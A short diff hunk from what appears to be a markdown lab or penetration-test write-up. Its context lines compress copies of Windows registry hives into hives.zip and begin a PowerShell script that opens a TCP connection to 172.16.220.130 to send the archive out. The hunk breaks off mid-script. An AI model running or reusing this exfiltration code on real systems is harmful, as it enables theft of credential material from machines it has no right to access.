@@ -59,7 +59,6 @@ Compress-Archive -Path "C:\Users\Sammy\Desktop\SYSTEM-2025-02-11", "C:\Users\Sam
 
 ```powershell
 [System.IO.File]::WriteAllBytes("hives.zip", (Get-Content "C:\Users\Sammy\Desktop\hives.zip" -Encoding Byte))
-
 $client = New-Object System.Net.Sockets.TcpClient("172.16.220.130", 80)
 $stream = $client.GetStream()
 $bytes = [System.IO.File]::ReadAllBytes("C:\Users\Sammy\Desktop\hives.zip")
